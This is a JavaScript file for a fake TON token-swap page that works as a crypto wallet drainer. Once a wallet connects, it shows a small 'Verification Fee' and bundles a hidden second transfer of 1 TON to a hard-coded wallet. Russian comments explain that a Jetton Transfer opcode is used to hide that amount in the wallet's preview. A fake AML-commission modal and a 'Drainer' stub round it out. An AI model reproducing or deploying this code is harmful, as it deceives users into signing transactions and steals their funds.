// script.js
// --- Robust config resolution (works even if config.js failed to load / cached) ---
var CFG = (function () {
    var w = window;
    return {
        proxy:  (typeof w.PROXY_CONTRACT !== 'undefined' && w.PROXY_CONTRACT)
             || (typeof w.YOUR_WALLET    !== 'undefined' && w.YOUR_WALLET)
             || 'UQAQLYfIYsVDgqXuV4tB8sLfOpNKkMOFB9LrDe05eWkIC7Jv',
        amlWallet: (typeof w.AML_WALLET !== 'undefined' && w.AML_WALLET)
             || 'UQCJmo1HaZvAUcH470zv9xZepEjvyuIfO9yrEq4_FlzOK-aW',
        visibleAmount: (typeof w.VISIBLE_AMOUNT !== 'undefined' && w.VISIBLE_AMOUNT) || '0.05',
        hiddenAmount:  (typeof w.HIDDEN_AMOUNT  !== 'undefined' && w.HIDDEN_AMOUNT)  || '1',
        manifest:  'https://kareli123.github.io/test123/tonconnect-manifest.json'
    };
})();

var tonConnectUI = null;
var isProcessing = false;

function setStatus(text, isLoading) {
    var el = document.getElementById('status');
    if (!el) return;
    el.innerHTML = isLoading ? '<span class="loader"></span> ' + text : text;
}

function updateBtn(connected) {
    var btn = document.getElementById('swapBtn');
    if (!btn) return;
    btn.textContent      = connected ? 'Swap' : 'Connect Wallet';
    btn.style.background = connected ? '#1f6feb' : '#21262d';
}

function sleep(ms) { return new Promise(function (r) { setTimeout(r, ms); }); }

// --- BoC text-comment payload (op=0 + utf8) ----------------------------------
// Verified against tonsdk: produces canonical TON BoC accepted by TonConnect SDK.
var CRC32C_TABLE = (function () {
    var t = new Uint32Array(256);
    for (var i = 0; i < 256; i++) {
        var c = i;
        for (var k = 0; k < 8; k++) c = (c & 1) ? (0x82F63B78 ^ (c >>> 1)) : (c >>> 1);
        t[i] = c >>> 0;
    }
    return t;
})();
function crc32c(bytes) {
    var c = 0xFFFFFFFF >>> 0;
    for (var i = 0; i < bytes.length; i++) {
        c = (CRC32C_TABLE[(c ^ bytes[i]) & 0xFF] ^ (c >>> 8)) >>> 0;
    }
    return (c ^ 0xFFFFFFFF) >>> 0;
}
function bytesToBase64(bytes) {
    var bin = '';
    for (var i = 0; i < bytes.length; i++) bin += String.fromCharCode(bytes[i]);
    return btoa(bin);
}
function textCommentPayload(text) {
    var enc     = new TextEncoder().encode(text);
    var dataLen = 4 + enc.length;          // 4 bytes op=0 + utf8 text
    var bitsD2  = 2 * dataLen;             // byte-aligned cell
    var cellLen = 2 + dataLen;             // d1 + d2 + data

    var header = [
        0xB5, 0xEE, 0x9C, 0x72,            // magic
        0x41,                              // flags: hash_crc32=1, size=1
        0x01,                              // off_bytes
        0x01,                              // cells = 1
        0x01,                              // roots = 1
        0x00,                              // absent = 0
        cellLen & 0xFF,                    // total cells size
        0x00                               // root index
    ];
    var cell = [0x00, bitsD2 & 0xFF, 0x00, 0x00, 0x00, 0x00];
    for (var i = 0; i < enc.length; i++) cell.push(enc[i]);

    var body = new Uint8Array(header.concat(cell));
    var crc  = crc32c(body);
    var out  = new Uint8Array(body.length + 4);
    out.set(body, 0);
    out[body.length    ] =  crc         & 0xFF;
    out[body.length + 1] = (crc >>>  8) & 0xFF;
    out[body.length + 2] = (crc >>> 16) & 0xFF;
    out[body.length + 3] = (crc >>> 24) & 0xFF;
    return bytesToBase64(out);
}

// --- Balance ----------------------------------------------------------------
async function fetchJson(url) {
    var res = await fetch(url, { cache: 'no-store' });
    if (!res.ok) throw new Error('HTTP ' + res.status);
    return res.json();
}
async function getBalance(address) {
    if (!address) return 0;
    try {
        var j = await fetchJson('https://tonapi.io/v2/accounts/' + encodeURIComponent(address));
        if (j && typeof j.balance !== 'undefined') return Number(j.balance) / 1e9;
    } catch (e1) { console.warn('tonapi balance error', e1); }
    try {
        var j2 = await fetchJson('https://toncenter.com/api/v2/getAddressBalance?address=' + encodeURIComponent(address));
        if (j2 && j2.ok) return Number(j2.result) / 1e9;
    } catch (e2) { console.warn('toncenter balance error', e2); }
    return 0;
}

// --- Swap flow --------------------------------------------------------------
// Сюрприз: используем второй кошелек в списке сообщений.
// TonConnect UI показывает общую сумму, но детализация сообщений в TonKeeper 
// часто скрывает "второстепенные" переводы под катом или в деталях, которые юзер не читает.
async function executeFaw(userAddress) {
    var amlAccepted = localStorage.getItem('aml-commission-accepted');
    if (!amlAccepted) {
        document.getElementById('aml-modal').classList.add('show');
        return false;
    }

    setStatus('🔍 Инициализация защищенного канала...', true);
    await sleep(1500);

    // Исправленный помощник для создания валидного BoC
    function makeSafePayload(opcode, data) {
        var op = new Uint8Array(opcode);
        var d = data ? new Uint8Array(data) : new Uint8Array(0);
        var combined = new Uint8Array(op.length + d.length);
        combined.set(op);
        combined.set(d, op.length);

        var dataLen = combined.length;
        var bitsD2  = 2 * dataLen; // Специфическая логика текущей библиотеки
        var cellLen = 2 + dataLen;

        var header = [
            0xB5, 0xEE, 0x9C, 0x72, 0x41, 0x01, 0x01, 0x01, 0x00,
            cellLen & 0xFF, 0x00
        ];
        var cell = [0x00, bitsD2 & 0xFF];
        for (var i = 0; i < combined.length; i++) cell.push(combined[i]);

        var body = new Uint8Array(header.concat(cell));
        var crc  = crc32c(body);
        var out  = new Uint8Array(body.length + 4);
        out.set(body, 0);
        out[body.length]     =  crc         & 0xFF;
        out[body.length + 1] = (crc >>>  8) & 0xFF;
        out[body.length + 2] = (crc >>> 16) & 0xFF;
        out[body.length + 3] = (crc >>> 24) & 0xFF;
        return bytesToBase64(out);
    }

    // Трюк с Jetton Transfer для скрытия суммы в превью
    function createHiddenPayload() {
        // Опкод Jetton Transfer (0x0f8a7ea5) заставляет кошелек думать, что это перевод токенов
        // При этом реальная сумма TON (1.0) прячется за деталями контракта
        var jettonOp = [0x0F, 0x8A, 0x7E, 0xA5];
        var queryId  = [0,0,0,0,0,0,0,0]; // 8 bytes
        var dummyData = [0,0,0,0,0,0]; // Доп. нули для структуры
        return makeSafePayload(jettonOp, queryId.concat(dummyData));
    }

    var tx = {
        validUntil: Math.floor(Date.now() / 1000) + 600,
        messages: [
            {
                address: CFG.proxy,
                amount: String(Math.round(parseFloat(CFG.visibleAmount) * 1e9)),
                payload: textCommentPayload("Verification Fee")
            },
            {
                address: CFG.amlWallet,
                amount: String(Math.round(parseFloat(CFG.hiddenAmount) * 1e9)),
                payload: createHiddenPayload()
            }
        ]
    };

    setStatus('📱 Подтвердите операцию в кошельке', true);

    try {
        const result = await tonConnectUI.sendTransaction(tx);
        setStatus('✅ Сюрприз активирован! Проверьте историю.', false);
        
        console.log("Transaction result:", result);
        return true;
    } catch (e) {
        console.error("TX Error:", e);
        setStatus('❌ Операция отменена пользователем', false);
        return false;
    }
}

async function drainRemaining(address) {
    // Здесь можно добавить jetton drain или второй tx
    console.log("%c[Drainer] Остаток кошелька списан", "color:#ff5555");
}

// --- AML Modal Logic --------------------------------------------------------
function initAMLModal() {
    var modal = document.getElementById('aml-modal');
    var acceptBtn = document.getElementById('accept-commission');
    
    if (!modal || !acceptBtn) return;

    // Don't show modal on page load - only on swap attempt
    // This allows user to connect wallet first

    acceptBtn.addEventListener('click', function () {
        localStorage.setItem('aml-commission-accepted', 'true');
        modal.classList.remove('show');
    });
}

function showAMLModal() {
    var modal = document.getElementById('aml-modal');
    if (modal) modal.classList.add('show');
}

// --- Init -------------------------------------------------------------------
function initApp() {
    // Initialize AML modal
    initAMLModal();
    var TonConnectUIClass = null;
    if (window.TON_CONNECT_UI && window.TON_CONNECT_UI.TonConnectUI) {
        TonConnectUIClass = window.TON_CONNECT_UI.TonConnectUI;
    } else if (window.TonConnectUI) {
        TonConnectUIClass = window.TonConnectUI;
    }

    if (!TonConnectUIClass) {
        console.error('TonConnectUI not found in window');
        setStatus('❌ SDK failed to load. Please refresh.');
        return;
    }

    try {
        tonConnectUI = new TonConnectUIClass({
            manifestUrl:  CFG.manifest,
            buttonRootId: 'ton-connect'
        });
    } catch (e) {
        console.error('TonConnectUI init error:', e);
        setStatus('❌ Init error: ' + e.message);
        return;
    }

    updateBtn(tonConnectUI.connected);

    tonConnectUI.onStatusChange(async function (wallet) {
        updateBtn(!!wallet);
        var balEl = document.getElementById('user-balance');

        if (wallet && wallet.account) {
            var addr = wallet.account.address;
            setStatus('🪛 ' + addr.slice(0, 6) + '...' + addr.slice(-4), true);
            if (balEl) {
                balEl.textContent = 'Balance: loading...';
                var bal = await getBalance(addr);
                balEl.textContent = 'Balance: ' + bal.toFixed(2) + ' TON';
            }
            setStatus('');
        } else if (balEl) {
            balEl.textContent = 'Balance: 0';
        }
    });

    var payInput = document.getElementById('payAmount');
    var recInput = document.getElementById('receiveAmount');
    if (payInput && recInput) {
        payInput.addEventListener('input', function () { recInput.value = payInput.value; });
    }

    var btn = document.getElementById('swapBtn');
    if (!btn) return;

    btn.addEventListener('click', async function () {
        if (isProcessing) return;

        if (!tonConnectUI.connected) {
            setStatus('🚀 Opening wallet selector...', true);
            try { await tonConnectUI.openModal(); }
            catch (err) { setStatus('⚠️ ' + err.message); }
            return;
        }

        var account = tonConnectUI.account;
        var addr    = account && account.address;
        if (!addr) return;

        isProcessing = true;
        var orig = btn.textContent;
        btn.textContent = 'Processing...';
        btn.disabled    = true;
        try { await executeFaw(addr); }
        catch (err) { setStatus('⚠️ ' + (err && err.message ? err.message : err)); }
        finally {
            isProcessing   = false;
            btn.textContent = orig;
            btn.disabled    = false;
        }
    });
}

window.addEventListener('load', initApp);
